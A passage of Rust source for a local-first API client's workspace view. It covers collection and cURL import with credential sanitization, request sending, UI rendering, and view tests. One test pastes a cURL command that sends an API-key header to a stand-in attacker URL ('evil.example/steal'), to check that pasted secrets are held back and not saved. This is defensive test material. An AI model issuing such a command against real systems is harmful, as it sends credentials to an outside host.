    fn delete_folder_now(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        if self.projects[self.active_project].delete_folder(id) {
            self.reconcile_after_container_delete("Folder deleted", window, cx);
        }
    }

    pub(super) fn confirm_delete_collection(
        &mut self,
        id: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let name = self
            .current()
            .find_collection(&id)
            .map(|c| c.name.clone())
            .unwrap_or_else(|| "this collection".into());
        let weak_view = cx.weak_entity();
        window.open_dialog(cx, move |dialog, _, _| {
            let weak_ok = weak_view.clone();
            let coll_id = id.clone();
            dialog
                .w(px(420.))
                .title("Delete Collection")
                .button_props(
                    DialogButtonProps::default()
                        .ok_text("Delete Collection")
                        .ok_variant(ButtonVariant::Danger)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let _ = weak_ok.update(cx, |view, cx| {
                        view.delete_collection_now(&coll_id, window, cx);
                    });
                    true
                })
                .child(div().text_size(px(13.)).child(format!(
                    "Delete collection \"{name}\" and all folders/requests inside it? This cannot be undone."
                )))
        });
    }

    fn delete_collection_now(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        if self.projects[self.active_project].delete_collection(id) {
            self.reconcile_after_container_delete("Collection deleted", window, cx);
        }
    }

    pub(super) fn open_variables_sheet(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let sheet_view =
            cx.new(|cx| VariablesSheetView::new(&self.current().variables, window, cx));
        let weak_workspace = cx.weak_entity();
        let project_name = self.current().name.clone();
        window.open_sheet(cx, move |sheet, _, _| {
            let sheet_save = sheet_view.clone();
            let weak_save = weak_workspace.clone();
            sheet
                .size(px(520.))
                .title(format!("Variables · {project_name}"))
                .child(sheet_view.clone())
                .footer(
                    div()
                        .w_full()
                        .flex()
                        .items_center()
                        .justify_end()
                        .gap_2()
                        .child(
                            Button::new("vars-cancel")
                                .small()
                                .outline()
                                .label("Cancel")
                                .on_click(|_, window, cx| window.close_sheet(cx)),
                        )
                        .child(
                            Button::new("vars-save")
                                .small()
                                .primary()
                                .icon(svg_icon("icons/save.svg").small())
                                .label("Save Variables")
                                .on_click(move |_, window, cx| {
                                    let map = sheet_save.read(cx).variables_map(cx);
                                    let _ = weak_save.update(cx, |view, cx| {
                                        view.projects[view.active_project].variables = map;
                                        view.refresh_template_inspection(cx);
                                        match view.store.save(view.current()) {
                                            Ok(()) => {
                                                view.set_status("Variables saved", false, cx);
                                                window.push_notification(
                                                    Notification::success(
                                                        "Project variables saved",
                                                    ),
                                                    cx,
                                                );
                                            }
                                            Err(err) => {
                                                let msg = format!("Save variables failed: {err:#}");
                                                view.set_status(msg.clone(), true, cx);
                                                window.push_notification(
                                                    Notification::error(msg),
                                                    cx,
                                                );
                                            }
                                        }
                                    });
                                    window.close_sheet(cx);
                                }),
                        ),
                )
        });
    }

    fn finalize_collection_import(
        &mut self,
        report: import::ImportReport,
        sanitized_summary: Option<fastman_core::security::SanitizeSummary>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Result<()> {
        let count = report.requests_imported;
        let warnings = report.warnings.len();
        let project_name = report.project.name.clone();
        self.store.save(&report.project)?;
        self.projects.push(report.project);
        let last = self.projects.len() - 1;
        let choices = project_choices(&self.projects);
        self.project_selector.update(cx, |sel, cx| {
            sel.set_items(choices, window, cx);
            sel.set_selected_index(Some(IndexPath::default().row(last)), window, cx);
        });
        self.switch_project(last, window, cx);
        let note = match sanitized_summary {
            Some(s) => format!(
                "Imported {count} requests into '{project_name}' (moved {} auth field(s) to session-only, stripped {})",
                s.moved_to_session_auth, s.stripped_fields
            ),
            None if warnings > 0 => {
                format!("Imported {count} requests into '{project_name}' ({warnings} warning(s))")
            }
            None => format!("Imported {count} requests into '{project_name}'"),
        };
        self.set_status(note.clone(), false, cx);
        window.push_notification(Notification::success(note), cx);
        Ok(())
    }

    pub(super) fn open_import_dialog(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let modal_view = cx.new(|cx| ImportDialogView::new(window, cx));
        let initial_focus = Cell::new(true);
        let weak_workspace = cx.weak_entity();
        window.open_dialog(cx, move |dialog, window, cx| {
            if initial_focus.replace(false) {
                modal_view
                    .read(cx)
                    .input
                    .read(cx)
                    .focus_handle(cx)
                    .focus(window, cx);
            }
            let modal_ok = modal_view.clone();
            let weak_ok = weak_workspace.clone();
            let is_confirm_step = modal_view.read(cx).pending_sensitive.is_some();
            dialog
                .w(px(580.))
                .title(if is_confirm_step {
                    "Confirm cURL / Collection Import"
                } else {
                    "Import Collection or cURL"
                })
                .button_props(
                    DialogButtonProps::default()
                        .ok_text(if is_confirm_step {
                            "Continue Import"
                        } else {
                            "Import"
                        })
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let pending_step = modal_ok.update(cx, |m, _| {
                        m.error = None;
                        m.pending_sensitive.take().map(|p| (p, m.sensitive_choice))
                    });
                    if let Some((pending, choice)) = pending_step {
                        match pending {
                            PendingSensitiveImport::Collection(mut report) => {
                                let sanitized = if choice == 0 {
                                    Some(report.sanitize_credentials())
                                } else {
                                    None
                                };
                                let mut saved_ok = true;
                                let _ = weak_ok.update(cx, |view, cx| {
                                    if let Err(err) =
                                        view.finalize_collection_import(report, sanitized, window, cx)
                                    {
                                        saved_ok = false;
                                        modal_ok.update(cx, |m, cx| {
                                            m.error = Some(format!("Failed to save project: {err:#}"));
                                            cx.notify();
                                        });
                                    }
                                });
                                return saved_ok;
                            }
                            PendingSensitiveImport::Curl(report, findings) => {
                                let mut req = report.request;
                                let summary = (!findings.is_empty() && choice == 0)
                                    .then(|| sanitize_request_credentials(&mut req));
                                let label = format!("{} {}", req.method, req.name);
                                let unsupported = report.unsupported_flags;
                                let _ = weak_ok.update(cx, |view, cx| {
                                    view.insert_and_open_request(req, window, cx);
                                    let mut note = match summary {
                                        Some(s) => format!(
                                            "Imported cURL: {label} (moved {} to session Auth, stripped {})",
                                            s.moved_to_session_auth, s.stripped_fields
                                        ),
                                        None => format!("Imported cURL: {label}"),
                                    };
                                    if !unsupported.is_empty() {
                                        note.push_str(&format!(
                                            " · ignored flags: {}",
                                            unsupported.join(", ")
                                        ));
                                    }
                                    view.set_status(note.clone(), false, cx);
                                    window.push_notification(Notification::success(note), cx);
                                });
                                return true;
                            }
                        }
                    }

                    let (mode, raw_text) = {
                        let modal = modal_ok.read(cx);
                        (modal.mode, modal.input.read(cx).value().to_string())
                    };
                    if raw_text.trim().is_empty() {
                        modal_ok.update(cx, |m, cx| {
                            m.error = Some("Paste Collection JSON or a cURL command first.".into());
                            cx.notify();
                        });
                        return false;
                    }
                    if mode == 0 {
                        if raw_text.len() > import::MAX_IMPORT_BYTES {
                            modal_ok.update(cx, |m, cx| {
                                m.error = Some(format!(
                                    "Collection exceeds maximum size ({} bytes).",
                                    import::MAX_IMPORT_BYTES
                                ));
                                cx.notify();
                            });
                            return false;
                        }
                        match import::collection_v21(&raw_text) {
                            Ok(report) if !report.sensitive_fields.is_empty() => {
                                modal_ok.update(cx, |m, cx| {
                                    m.sensitive_choice = 0;
                                    m.pending_sensitive =
                                        Some(PendingSensitiveImport::Collection(report));
                                    cx.notify();
                                });
                                false
                            }
                            Ok(report) => {
                                let mut saved_ok = true;
                                let _ = weak_ok.update(cx, |view, cx| {
                                    if let Err(err) =
                                        view.finalize_collection_import(report, None, window, cx)
                                    {
                                        saved_ok = false;
                                        modal_ok.update(cx, |m, cx| {
                                            m.error = Some(format!("Failed to save project: {err:#}"));
                                            cx.notify();
                                        });
                                    }
                                });
                                saved_ok
                            }
                            Err(err) => {
                                modal_ok.update(cx, |m, cx| {
                                    m.error = Some(format!("{err:#}"));
                                    cx.notify();
                                });
                                false
                            }
                        }
                    } else {
                        if raw_text.len() > curl::MAX_CURL_IMPORT_BYTES {
                            modal_ok.update(cx, |m, cx| {
                                m.error = Some(format!(
                                    "cURL command exceeds maximum size ({} bytes).",
                                    curl::MAX_CURL_IMPORT_BYTES
                                ));
                                cx.notify();
                            });
                            return false;
                        }
                        match curl::parse_curl_report(&raw_text) {
                            Ok(report) => {
                                let mut findings = Vec::new();
                                collect_sensitive_request_findings(&report.request, &mut findings);
                                if !findings.is_empty() || !report.unsupported_flags.is_empty() {
                                    modal_ok.update(cx, |m, cx| {
                                        m.sensitive_choice = 0;
                                        m.pending_sensitive =
                                            Some(PendingSensitiveImport::Curl(report, findings));
                                        cx.notify();
                                    });
                                    return false;
                                }
                                let req = report.request;
                                let label = format!("{} {}", req.method, req.name);
                                let has_session_auth = !matches!(req.auth, Auth::None);
                                let _ = weak_ok.update(cx, |view, cx| {
                                    view.insert_and_open_request(req, window, cx);
                                    let note = if has_session_auth {
                                        format!("Imported cURL: {label} (Auth kept session-only)")
                                    } else {
                                        format!("Imported cURL: {label}")
                                    };
                                    view.set_status(note.clone(), false, cx);
                                    window.push_notification(Notification::success(note), cx);
                                });
                                true
                            }
                            Err(err) => {
                                modal_ok.update(cx, |m, cx| {
                                    m.error = Some(format!("{err:#}"));
                                    cx.notify();
                                });
                                false
                            }
                        }
                    }
                })
                .child(modal_view.clone())
        });
    }

    pub(super) fn cancel(&mut self, cx: &mut Context<Self>) {
        self.run_generation = self.run_generation.wrapping_add(1);
        self.in_flight_request_id = None;
        if let Some(abort) = self.pending_abort.take() {
            abort.abort();
        }
        self.pending = None;
        self.set_status("Request cancelled / idle", false, cx);
    }

    pub(super) fn send(&mut self, window: Option<&mut Window>, cx: &mut Context<Self>) {
        if let Err(error) = self.save_if_dirty(cx) {
            let msg = format!("Cannot send: {error:#}");
            self.set_status(msg.clone(), true, cx);
            if let Some(window) = window {
                window.push_notification(Notification::error(msg), cx);
            }
            return;
        }
        let Some(request) = self.current_request().cloned() else {
            return;
        };
        let request_id = request.id.clone();
        let variables = self.current().variables.clone();
        self.cancel(cx);
        self.in_flight_request_id = Some(request_id.clone());
        self.set_status(
            format!(
                "Sending {} {}…",
                request.method,
                fastman_core::security::redact_url_secrets(&request.url)
            ),
            false,
            cx,
        );

        let generation = self.run_generation;
        let engine = self.engine.clone();
        let sent_method = SharedString::from(request.method.clone());
        let sent_url = SharedString::from(request.url.clone());
        let sent_method_fallback = sent_method.clone();
        let sent_url_fallback = sent_url.clone();
        let handle = self.runtime.spawn(async move {
            match engine.send(&request, &variables).await {
                Ok(response) => {
                    let status_line = SharedString::from(format!(
                        "{} {} · {} · {}",
                        response.status,
                        response.reason,
                        crate::response_view::format_duration(response.elapsed_ms),
                        crate::response_view::format_bytes(response.bytes_received),
                    ));
                    let entry = ResponseCacheEntry::from_response(response, sent_method, sent_url);
                    Ok((entry, status_line))
                }
                Err(error) => Err(ResponseCacheEntry::from_error(
                    error.to_string(),
                    sent_method,
                    sent_url,
                )),
            }
        });
        self.pending_abort = Some(handle.abort_handle());
        self.pending = Some(cx.spawn(async move |this, cx| {
            let result = handle.await;
            _ = this.update(cx, |view, cx| {
                if view.run_generation != generation {
                    return;
                }
                view.pending_abort = None;
                view.in_flight_request_id = None;
                match result {
                    Ok(Ok((entry, status_line))) => {
                        view.cache_response(request_id, entry);
                        view.refresh_response_search_matches(cx);
                        view.reset_response_scroll();
                        view.set_status(status_line, false, cx);
                    }
                    Ok(Err(entry)) => {
                        view.cache_response(request_id, entry);
                        view.refresh_response_search_matches(cx);
                        view.set_status("Request failed", true, cx);
                    }
                    Err(error) => {
                        view.cache_response(
                            request_id,
                            ResponseCacheEntry::from_error(
                                error.to_string(),
                                sent_method_fallback,
                                sent_url_fallback,
                            ),
                        );
                        view.refresh_response_search_matches(cx);
                        view.set_status("Request interrupted", true, cx);
                    }
                }
                cx.notify();
            });
        }));
        cx.notify();
    }

    pub(super) fn toggle_theme(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let next = if cx.theme().is_dark() {
            ThemeMode::Light
        } else {
            ThemeMode::Dark
        };
        Theme::change(next, Some(window), cx);
        crate::theme::apply_crisp_motion(cx);
        self.set_status(format!("Theme: {}", next.name()), false, cx);
    }

    pub(super) fn open_command_palette(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if window.has_active_dialog(cx)
            && self
                .active_command_palette
                .as_ref()
                .is_some_and(|weak| weak.upgrade().is_some())
        {
            self.active_command_palette = None;
            window.close_dialog(cx);
            return;
        }

        let weak_workspace = cx.weak_entity();
        let palette_view =
            cx.new(|cx| CommandPaletteView::new(self, weak_workspace.clone(), window, cx));
        self.active_command_palette = Some(palette_view.downgrade());
        let initial_focus = Cell::new(true);

        window.open_dialog(cx, move |dialog, window, cx| {
            if initial_focus.replace(false) {
                let palette = palette_view.clone();
                palette.update(cx, |view, cx| view.focus(window, cx));
            }
            let weak_close = weak_workspace.clone();
            dialog
                .w(px(640.))
                .close_button(false)
                .entrance(DialogEntrance::None)
                .py_2()
                .on_close(move |_, _, cx| {
                    let _ = weak_close.update(cx, |view, _| {
                        view.active_command_palette = None;
                    });
                })
                .child(palette_view.clone())
        });
    }

    fn render_request_response_area(&self, cx: &mut Context<Self>) -> AnyElement {
        match self.response_position {
            ResponsePosition::Bottom => v_resizable("request-response-panels-bottom")
                .child(
                    resizable_panel()
                        .size(px(360.))
                        .size_range(px(200.)..px(900.))
                        .child(self.render_request_panel(cx)),
                )
                .child(
                    resizable_panel()
                        .size_range(px(180.)..px(900.))
                        .child(self.render_response_panel(cx)),
                )
                .into_any_element(),
            ResponsePosition::Left => h_resizable("request-response-panels-left")
                .child(
                    resizable_panel()
                        .size_range(px(260.)..Pixels::MAX)
                        .child(self.render_response_panel(cx)),
                )
                .child(
                    resizable_panel()
                        .size_range(px(280.)..Pixels::MAX)
                        .child(self.render_request_panel(cx)),
                )
                .into_any_element(),
            ResponsePosition::Right => h_resizable("request-response-panels-right")
                .child(
                    resizable_panel()
                        .size_range(px(280.)..Pixels::MAX)
                        .child(self.render_request_panel(cx)),
                )
                .child(
                    resizable_panel()
                        .size_range(px(260.)..Pixels::MAX)
                        .child(self.render_response_panel(cx)),
                )
                .into_any_element(),
        }
    }
}

impl Render for WorkspaceView {
    fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        let bg = cx.theme().background;
        let title_bar_bg = cx.theme().title_bar;
        let title_border = cx.theme().title_bar_border;
        let status_bg = cx.theme().status_bar;
        let status_border = cx.theme().status_bar_border;
        let fg = cx.theme().foreground;
        let muted_fg = cx.theme().muted_foreground;
        let is_dark = cx.theme().is_dark();

        let workspace_view = cx.weak_entity();
        let var_count = self.current().variables.len();
        let req_count = self.cached_request_count;

        let header = div()
            .h(px(44.))
            .px_3()
            .flex_shrink_0()
            .flex()
            .items_center()
            .gap_2()
            .bg(title_bar_bg)
            .border_b_1()
            .border_color(title_border)
            .child(
                Button::new("workspace-selector")
                    .ghost()
                    .small()
                    .dropdown_caret(true)
                    .icon(svg_icon("icons/layers.svg").small())
                    .label(self.workspaces[self.active_workspace].name.clone())
                    .dropdown_menu(move |mut menu, _, cx| {
                        let (choices, active_ws) = workspace_view
                            .upgrade()
                            .map(|entity| {
                                let view = entity.read(cx);
                                (
                                    view.workspaces
                                        .iter()
                                        .map(|w| w.name.clone())
                                        .collect::<Vec<_>>(),
                                    view.active_workspace,
                                )
                            })
                            .unwrap_or_default();
                        for (index, name) in choices.into_iter().enumerate() {
                            let view = workspace_view.clone();
                            menu = menu.item(
                                PopupMenuItem::new(name)
                                    .checked(index == active_ws)
                                    .on_click(move |_, window, cx| {
                                        let _ = view.update(cx, |view, cx| {
                                            view.switch_workspace(index, window, cx);
                                        });
                                    }),
                            );
                        }
                        let view_new = workspace_view.clone();
                        menu.separator().item(
                            PopupMenuItem::new("New Workspace...")
                                .icon(svg_icon("icons/plus.svg"))
                                .on_click(move |_, window, cx| {
                                    let _ = view_new.update(cx, |view, cx| {
                                        view.open_name_dialog(
                                            NameDialogKind::NewWorkspace,
                                            window,
                                            cx,
                                        );
                                    });
                                }),
                        )
                    }),
            )
            .child(div().flex_1())
            .child(
                Button::new("open-command-palette")
                    .small()
                    .outline()
                    .icon(svg_icon("icons/search.svg").small())
                    .label("Commands")
                    .when_some(
                        Kbd::global_binding_for_action(&OpenCommandPalette, window),
                        |btn, kbd| btn.child(kbd),
                    )
                    .tooltip("Open Command Palette (Ctrl+K)")
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.open_command_palette(window, cx);
                    })),
            )
            .child(
                Button::new("open-variables")
                    .small()
                    .outline()
                    .icon(svg_icon("icons/variable.svg").small())
                    .label("Variables")
                    .when(var_count > 0, |btn| btn.child(count_pill(var_count, cx)))
                    .tooltip("Edit project variables")
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.open_variables_sheet(window, cx);
                    })),
            )
            .child(
                Button::new("open-import")
                    .small()
                    .outline()
                    .icon(svg_icon("icons/import.svg").small())
                    .label("Import")
                    .tooltip("Import Collection v2.1 JSON or cURL")
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.open_import_dialog(window, cx);
                    })),
            )
            .child(
                Button::new("toggle-theme")
                    .small()
                    .ghost()
                    .icon(
                        svg_icon(if is_dark {
                            "icons/sun.svg"
                        } else {
                            "icons/moon.svg"
                        })
                        .small(),
                    )
                    .tooltip(if is_dark {
                        "Switch to Light theme"
                    } else {
                        "Switch to Dark theme"
                    })
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.toggle_theme(window, cx);
                    })),
            );

        let status_dot_color = if self.in_flight_request_id.is_some() {
            cx.theme().info
        } else if self.status_is_error {
            cx.theme().danger
        } else {
            cx.theme().success
        };

        let status_bar = div()
            .h(px(26.))
            .px_3()
            .flex_shrink_0()
            .flex()
            .items_center()
            .justify_between()
            .gap_3()
            .bg(status_bg)
            .border_t_1()
            .border_color(status_border)
            .text_size(px(11.5))
            .text_color(muted_fg)
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap_2()
                    .min_w_0()
                    .child(
                        div()
                            .w(px(7.))
                            .h(px(7.))
                            .rounded_full()
                            .flex_shrink_0()
                            .bg(status_dot_color),
                    )
                    .child(div().truncate().child(self.status.clone())),
            )
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap_3()
                    .flex_shrink_0()
                    .child(format!("{req_count} requests · {var_count} variables"))
                    .child(
                        div()
                            .flex()
                            .items_center()
                            .gap_1()
                            .child(
                                svg_icon("icons/shield-check.svg")
                                    .xsmall()
                                    .text_color(cx.theme().success),
                            )
                            .child("Local-first"),
                    ),
            );

        div()
            .id("fastman-root")
            .track_focus(&self.focus_handle)
            .on_action(cx.listener(|view, _: &SendRequest, window, cx| {
                view.send(Some(window), cx);
            }))
            .on_action(cx.listener(|view, _: &SaveRequest, window, cx| {
                view.save_with_toast(window, cx);
            }))
            .on_action(cx.listener(|view, _: &NewRequest, window, cx| {
                view.add_request(window, cx);
            }))
            .on_action(cx.listener(|view, _: &CloseActiveTab, window, cx| {
                if let Some(id) = view.selected_id.clone() {
                    view.close_tab(&id, window, cx);
                }
            }))
            .on_action(cx.listener(|view, _: &FocusUrl, window, cx| {
                view.url.read(cx).focus_handle(cx).focus(window, cx);
            }))
            .on_action(cx.listener(|view, _: &FocusSearch, window, cx| {
                view.explorer_search
                    .read(cx)
                    .focus_handle(cx)
                    .focus(window, cx);
            }))
            .on_action(cx.listener(|view, _: &ToggleTheme, window, cx| {
                view.toggle_theme(window, cx);
            }))
            .on_action(cx.listener(|view, _: &OpenVariables, window, cx| {
                view.open_variables_sheet(window, cx);
            }))
            .on_action(cx.listener(|view, _: &OpenImport, window, cx| {
                view.open_import_dialog(window, cx);
            }))
            .on_action(cx.listener(|view, _: &OpenCommandPalette, window, cx| {
                view.open_command_palette(window, cx);
            }))
            .size_full()
            .flex()
            .flex_col()
            .bg(bg)
            .text_size(px(13.))
            .text_color(fg)
            .child(header)
            .child(
                div().flex_1().min_h_0().child(
                    h_resizable("workspace-panels")
                        .child(
                            resizable_panel()
                                .size(px(270.))
                                .size_range(px(210.)..px(480.))
                                .child(self.render_explorer_panel(cx)),
                        )
                        .child(
                            resizable_panel().child(
                                div()
                                    .size_full()
                                    .child(self.render_request_response_area(cx)),
                            ),
                        ),
                ),
            )
            .child(status_bar)
    }
}

#[cfg(test)]
mod tests {
    use super::WorkspaceView;
    use fastman_core::model::{ApiRequest, Folder};
    use fastman_core::storage::ProjectStore;
    use gpui::{AppContext, TestAppContext};

    #[test]
    fn fresh_workspace_has_no_sample_requests() {
        run_view_test(|| {
            let cx = TestAppContext::single();
            let root = tempfile::tempdir().unwrap();
            let store = ProjectStore::at(root.path());
            cx.update(gpui_kit::init);
            cx.update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| {
                        let view = WorkspaceView::with_store(store, window, cx).unwrap();
                        assert!(view.current().collections[0].folders.is_empty());
                        assert!(view.current().first_request_id().is_none());
                        assert!(view.selected_id.is_none());
                        assert!(view.url.read(cx).value().is_empty());
                        view
                    })
                })
                .unwrap();
            });
        });
    }

    fn seed_request(store: &ProjectStore) {
        let mut project = store.create("Test project").unwrap();
        let mut folder = Folder::new("Test folder");
        folder
            .requests
            .push(ApiRequest::new("GET", "Test request", ""));
        project.collections[0].folders.push(folder);
        store.save(&project).unwrap();
    }

    #[test]
    fn project_switch_saves_draft_but_keeps_it_open_on_conflict() {
        run_view_test(check_project_switch);
    }

    #[test]
    fn failed_tree_move_stays_dirty_and_blocks_project_switch() {
        run_view_test(check_failed_tree_move);
    }

    fn run_view_test(test: fn()) {
        // Building the full view in debug mode exceeds the default test stack on Windows.
        let result = std::thread::Builder::new()
            .stack_size(16 * 1024 * 1024)
            .spawn(test)
            .unwrap()
            .join();
        if let Err(panic) = result {
            std::panic::resume_unwind(panic);
        }
    }

    fn check_failed_tree_move() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                let project_id = view.current().id.clone();
                let request_id = view.selected_id.clone().unwrap();
                let original_folder = view.current().request_parent_folder(&request_id).unwrap();
                let collection_id = view.current().collections[0].id.clone();
                view.projects.push(store.create("Second project").unwrap());
                assert!(!view.dirty);

                let other_instance = ProjectStore::at(root.path());
                let mut external = other_instance.load(&project_id).unwrap();
                external.name = "Externally renamed".into();
                other_instance.save(&external).unwrap();

                view.move_request_to_collection(&request_id, &collection_id, window, cx);
                assert!(view.current().request_parent_folder(&request_id).is_none());
                assert!(view.status.contains("modified on disk"));
                assert!(view.dirty, "The in-memory move still needs to be saved");

                view.switch_project(1, window, cx);
                assert_eq!(view.active_project, 0);
                assert!(view.dirty);
                let disk = other_instance.load(&project_id).unwrap();
                assert_eq!(disk.name, "Externally renamed");
                assert_eq!(
                    disk.request_parent_folder(&request_id),
                    Some(original_folder)
                );
            });
        })
        .unwrap();
    }

    fn check_project_switch() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        let other_instance = ProjectStore::at(root.path());
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();
        let saved_url = "https://example.com/saved";
        let draft_url = "https://example.com/draft";
        let external_url = "https://example.com/external";

        let (project_id, request_id) = cx
            .update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    let ids = (view.current().id.clone(), view.selected_id.clone().unwrap());
                    view.projects.push(store.create("Second project").unwrap());
                    view.url
                        .update(cx, |input, cx| input.replace_all(saved_url, window, cx));
                    ids
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.dirty);
                view.switch_project(1, window, cx);
                assert_eq!(view.active_project, 1);
                assert!(!view.dirty);
                view.switch_project(0, window, cx);
                view.url
                    .update(cx, |input, cx| input.replace_all(draft_url, window, cx));
            });
        })
        .unwrap();

        let mut external = other_instance.load(&project_id).unwrap();
        assert_eq!(external.find_request(&request_id).unwrap().url, saved_url);
        external.find_request_mut(&request_id).unwrap().url = external_url.into();
        other_instance.save(&external).unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.dirty);
                view.switch_project(1, window, cx);
                assert_eq!(view.active_project, 0);
                assert_eq!(view.selected_id.as_deref(), Some(request_id.as_str()));
                assert_eq!(view.url.read(cx).value().as_ref(), draft_url);
                assert!(view.dirty);
                assert!(view.status_is_error);
                assert!(view.status.contains("modified on disk"));
            });
        })
        .unwrap();
        let disk = other_instance.load(&project_id).unwrap();
        assert_eq!(disk.find_request(&request_id).unwrap().url, external_url);
    }

    #[test]
    fn pasting_curl_into_url_bar_populates_editor() {
        run_view_test(check_url_curl_paste);
    }

    fn check_url_curl_paste() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.url.update(cx, |input, cx| {
                    input.replace_all(
                        r#"curl -X POST "https://api.example.com/v1/orders?dry=1" -H "Authorization: Bearer tok_123" -H "X-Trace: abc" -d '{"item":"book"}'"#,
                        window,
                        cx,
                    );
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert_eq!(v.method, "POST");
            assert_eq!(
                v.url.read(cx).value().as_ref(),
                "https://api.example.com/v1/orders"
            );
            assert_eq!(v.auth_kind, 2);
            assert_eq!(v.auth_token.read(cx).value().as_ref(), "tok_123");
            assert_eq!(v.body_kind, 1);
            assert_eq!(
                v.body_editor.read(cx).value().as_ref(),
                r#"{"item":"book"}"#
            );
            assert_eq!(v.params_active_count, 1);
            assert_eq!(v.headers_active_count, 1);
            assert!(v.dirty);
        })
        .unwrap();
    }

    #[test]
    fn template_inspection_tracks_missing_vars_and_masks_secrets() {
        run_view_test(check_template_inspection);
    }

    fn check_template_inspection() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        let mut project = store.create("Vars project").unwrap();
        project
            .variables
            .insert("host".into(), "https://api.example.com".into());
        project
            .variables
            .insert("api_token".into(), "secret_xyz".into());
        let mut req = ApiRequest::new(
            "GET",
            "Users",
            "{{host}}/users?token={{api_token}}&env={{missing_env}}",
        );
        req.headers
            .push(fastman_core::KeyValue::new("X-Tenant", "{{tenant_id}}"));
        project.collections[0].requests.push(req);
        store.save(&project).unwrap();

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert!(v.template_inspection.url_has_templates);
            assert_eq!(v.template_inspection.url_resolved_count, 2);
            assert_eq!(
                v.template_inspection.url_preview,
                "https://api.example.com/users?token=••••&env={{missing_env}}"
            );
            assert_eq!(
                v.template_inspection.missing_variables,
                vec!["missing_env".to_string(), "tenant_id".to_string()]
            );
            let url_tokens: Vec<String> = v
                .url
                .read(cx)
                .tokens()
                .iter()
                .map(|span| span.token().text().to_string())
                .collect();
            assert_eq!(url_tokens, vec!["{{host}}", "{{api_token}}"]);
        })
        .unwrap();
    }

    #[test]
    fn curl_paste_with_credentials_stages_outside_draft_and_cancel_then_save_preserves_prior_request()
     {
        run_view_test(check_curl_paste_cancel_then_save);
    }

    fn check_curl_paste_cancel_then_save() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        let mut project = store.create("Original Project").unwrap();
        let mut original = ApiRequest::new("POST", "Save Me", "https://example.com/original");
        original
            .headers
            .push(fastman_core::KeyValue::new("X-Keep", "1"));
        original.body = fastman_core::HttpBody::Json(r#"{"keep":true}"#.into());
        original.timeout_ms = 5_000;
        let project_id = project.id.clone();
        let request_id = original.id.clone();
        project.collections[0].requests.push(original);
        store.save(&project).unwrap();

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.url.update(cx, |input, cx| {
                    input.replace_all(
                        r#"curl -H "X-Api-Key: secret-canary" https://evil.example/steal"#,
                        window,
                        cx,
                    );
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, _, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(
                    view.url.read(cx).value().as_ref(),
                    "https://example.com/original"
                );
                assert!(!view.dirty);
                assert_eq!(view.method, "POST");
                assert_eq!(view.body_kind, 1);
                assert_eq!(view.headers_active_count, 1);
                let confirm = view
                    .active_curl_confirm
                    .as_ref()
                    .and_then(|w| w.upgrade())
                    .expect("confirmation dialog should be staged");
                assert_eq!(confirm.read(cx).findings_count, 1);
                assert!(confirm.read(cx).replace_summary.is_some());

                // Saving without confirming (e.g. after Cancel) must never persist pasted secrets.
                view.save(cx).unwrap();
            });
        })
        .unwrap();

        let disk_json =
